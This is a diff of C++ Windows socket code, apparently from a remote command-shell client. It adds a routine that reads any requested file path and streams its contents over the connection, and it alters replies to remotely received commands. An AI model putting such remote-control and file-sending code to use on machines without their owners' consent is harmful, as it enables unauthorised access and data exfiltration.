@@ -44,15 +44,47 @@ void Connection::sendMessage(const char *data) {
 
 
 void Connection::sendFile(string path) {
-    ifstream file{path, ifstream::binary};
+    //ifstream file{path, ifstream::binary};
     //unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BUFFER_SIZE + 1, 0);
-    vector<char> buffer(BUFFER_SIZE + 1, 0);
-
-    while (!file.eof()) {
-        file.read(buffer.data(), BUFFER_SIZE);
-        send(sock, buffer.data(), file.gcount(), 0);
+    HANDLE hFile = ::CreateFileA(path.c_str(),
+                                 GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
+                                 FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        sendMessage("Cant open the file");
+        cout << "Cant open the file" << endl;
+        return;
     }
-    file.close();
+    vector<char> buffer(BUFFER_SIZE + 1, 0);
+    DWORD bytesRead = sizeof(DWORD);
+    LARGE_INTEGER fileSize;
+    int totalReadData = 0;
+    ::GetFileSizeEx(hFile, &fileSize);
+    sendMessage(to_string(fileSize.QuadPart).c_str());
+
+    while (bytesRead != 0) {
+        ::ReadFile(hFile, buffer.data(), BUFFER_SIZE, &bytesRead, NULL);
+        send(sock, buffer.data(), bytesRead, 0);
+        totalReadData += bytesRead;
+    }
+    CloseHandle(hFile);
+    cout << "File size is " << fileSize.QuadPart << endl;
+    cout << "Total read data is " << totalReadData << endl;
+    char buff[9];
+    recv(sock, buff, 9, 0);
+    cout << "The final message is " << buff << endl;
+
+
+//    int total_file_read = 0;
+//    while (!file.eof()) {
+//        file.read(buffer.data(), BUFFER_SIZE);
+//        int size = file.gcount();
+//        total_file_read += size;
+//        cout << "File read size is " << size << endl;
+//        send(sock, buffer.data(), file.gcount(), 0);
+//    }
+//    cout << "Total file read size is " << total_file_read << endl;
+//    file.close();
+//    cout << "The size of the file is " << filesystem::file_size("path") << endl;
     return;
 }
 
@@ -203,7 +235,7 @@ void Connection::connection() {
 
             //If the command is not returning an output
             if (output.size() == 0) {
-                send(sock, ("Cant find the command " + command).c_str(), command.size() + 22, 0);
+                send(sock, " ", 1, 0);
                 continue;
             }
             send(sock, reinterpret_cast<const char *>(unOutput.c_str()), unOutput.size(), 0);
